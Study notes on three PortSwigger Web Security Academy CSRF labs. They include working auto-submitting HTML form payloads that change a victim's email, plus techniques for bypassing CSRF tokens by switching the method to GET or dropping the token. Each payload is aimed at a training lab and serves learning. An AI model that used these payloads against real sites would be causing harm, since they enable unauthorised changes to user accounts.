
## **1. CSRF vulnerability with no defenses**
This lab's email change functionality is vulnerable to CSRF.
1. Open Burp's browser and log in to your account. Submit the "Update email" form, and find the resulting request in your Proxy history.
2. If you're using [Burp Suite Professional](https://portswigger.net/burp/pro), right-click on the request and select Engagement tools / Generate CSRF PoC. Enable the option to include an auto-submit script and click "Regenerate".
    
    Alternatively, if you're using [Burp Suite Community Edition](https://portswigger.net/burp/communitydownload), use the following HTML template. You can get the request URL by right-clicking and selecting "Copy URL".
    
    `<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"> <input type="hidden" name="email" value="anything%40web-security-academy.net"> </form> <script> document.forms[0].submit(); </script>`
    
3. Go to the exploit server, paste your exploit HTML into the "Body" section, and click "Store".
4. To verify that the exploit works, try it on yourself by clicking "View exploit" and then check the resulting HTTP request and response.
5. Change the email address in your exploit so that it doesn't match your own.
6. Click "Deliver to victim" to solve the lab.

Vulnerable parameter - email change functionality
Goal - exploit the CSRF vulnerability and change the email address
creds - wiener:peter

In order for a CSRF attack to be possible:
- A relevant action - email change functionality
- Cookie based session handling - session cookie
- No unpredictable request parameters - satisfied

![[Pasted image 20240920205439.png]]

- HTML payload (form action= "https://HOST/POST")
```
<html>
    <body>
        <h1>Hello World!</h1>
        <iframe style="display:none" name="csrf-iframe"></iframe>
        <form action="https://target-acb91feb1e053ea78076271500a20022.web-security-academy.net/my-account/change-email" method="POST" target="csrf-iframe" id="csrf-form">
            <input type="hidden" name="email" value="test5@test.ca">
        </form>

        <script>document.getElementById("csrf-form").submit()</script>
    </body>
</html>
```

- Delivering trough a python server (https://localserver:8000/path/to/file)
```
python3 -m http.server <port-number>
```

- Accessing the above link will redirect the target to the 'desired' website meanwhile the reset email will be changed per our html script(payload)

## **2. CSRF where token validation depends on request method**
This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests. To solve the lab, use your exploit server to host an HTML page that uses a [CSRF attack](https://portswigger.net/web-security/csrf) to change the viewer's email address.

1. Open Burp's browser and log in to your account. Submit the "Update email" form, and find the resulting request in your Proxy history.
2. Send the request to Burp Repeater and observe that if you change the value of the `csrf` parameter then the request is rejected.
3. Use "Change request method" on the context menu to convert it into a GET request and observe that the CSRF token is no longer verified.
4. If you're using [Burp Suite Professional](https://portswigger.net/burp/pro), right-click on the request, and from the context menu select Engagement tools / Generate CSRF PoC. Enable the option to include an auto-submit script and click "Regenerate".
    
    Alternatively, if you're using [Burp Suite Community Edition](https://portswigger.net/burp/communitydownload), use the following HTML template. You can get the request URL by right-clicking and selecting "Copy URL".
    
    `<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"> <input type="hidden" name="email" value="anything%40web-security-academy.net"> </form> <script> document.forms[0].submit(); </script>`
5. Go to the exploit server, paste your exploit HTML into the "Body" section, and click "Store".
6. To verify if the exploit will work, try it on yourself by clicking "View exploit" and checking the resulting HTTP request and response.
7. Change the email address in your exploit so that it doesn't match your own.
8. Store the exploit, then click "Deliver to victim" to solve the lab.


Vulnerable parameter - email change functionality
Goal - exploit CSRF to change email address
Creds - wiener:peter

In order for a CSRF attack to be possible:
- A relevant action: change a users email
- Cookie-based session handling: session cookie
- No unpredictable request parameters: Request method can be changed to GET which does not require CSRF token

Testing CSRF Tokens:
1. Change the request method from POST to GET.

![[Pasted image 20240920210251.png]]
![[Pasted image 20240920210319.png]]
![[Pasted image 20240920210345.png]]
- now we can remove the CSRF token:
![[Pasted image 20240920210450.png]]

- HTML payload (form action="https://HOST/POST")
```
<html>
    <body>
        <h1>Hello World!</h1>
        <iframe style="display:none" name="csrf-iframe"></iframe>
        <form action="https://target-acee1f521e65f40d80e4b992006a0005.web-security-academy.net/my-account/change-email/" method="GET" target="csrf-iframe" id="csrf-form">
            <input type="hidden" name="email" value="test5@test.ca">
        </form>

        <script>document.getElementById("csrf-form").submit()</script>
    </body>
</html>
```

- Delivering trough a python server (https://localserver:8000/path/to/file)
```
python3 -m http.server <port-number>
```

- Accessing the above link will redirect the target to the 'desired' website meanwhile the reset email will be changed per our html script(payload)

## **3. CSRF where token validation depends on token being present**
This lab's email change functionality is vulnerable to CSRF. To solve the lab, use your exploit server to host an HTML page that uses a [CSRF attack](https://portswigger.net/web-security/csrf) to change the viewer's email address.

1. Open Burp's browser and log in to your account. Submit the "Update email" form, and find the resulting request in your Proxy history.
2. Send the request to Burp Repeater and observe that if you change the value of the `csrf` parameter then the request is rejected.
3. Delete the `csrf` parameter entirely and observe that the request is now accepted.
4. If you're using [Burp Suite Professional](https://portswigger.net/burp/pro), right-click on the request, and from the context menu select Engagement tools / Generate CSRF PoC. Enable the option to include an auto-submit script and click "Regenerate".
    
    Alternatively, if you're using [Burp Suite Community Edition](https://portswigger.net/burp/communitydownload), use the following HTML template. You can get the request URL by right-clicking and selecting "Copy URL".
    
    `<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"> <input type="hidden" name="$param1name" value="$param1value"> </form> <script> document.forms[0].submit(); </script>`
5. Go to the exploit server, paste your exploit HTML into the "Body" section, and click "Store".
6. To verify if the exploit will work, try it on yourself by clicking "View exploit" and checking the resulting HTTP request and response.
7. Change the email address in your exploit so that it doesn't match your own.
8. Store the exploit, then click "Deliver to victim" to solve the lab.


Vulnerable parameter - email change functionality
Goal - exploit CSRF to change email address
Creds - wiener:peter

Analysis:

In order for a CSRF attack to be possible:
- A relevant action: change a users email
- Cookie-based session handling: session cookie
- No unpredictable request parameters: csrf token is not mandatory

Testing CSRF Tokens:
1. Change the request method from POST to GET.
2.  Remove the CSRF token and see if application accepts request.